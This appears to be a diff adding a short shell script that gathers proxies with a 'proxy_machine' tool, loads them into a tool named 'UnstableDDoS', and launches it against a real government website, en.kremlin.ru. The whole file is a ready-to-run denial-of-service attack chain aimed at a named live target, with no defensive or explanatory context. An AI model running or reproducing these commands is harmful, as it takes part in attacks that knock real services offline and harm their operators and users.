@@ -1,0 +1,4 @@
+cd ./proxy_machine && python3.9 -m proxy_machine && 
+sed -i -e 's/http:\/\///g' proxies.txt && cd .. && 
+cp ./proxy_machine/proxies.txt ./UnstableDDoS/proxy.txt && 
+cd ./UnstableDDoS && python3.9 UNSTABLE_CLI.py --address http://en.kremlin.ru/
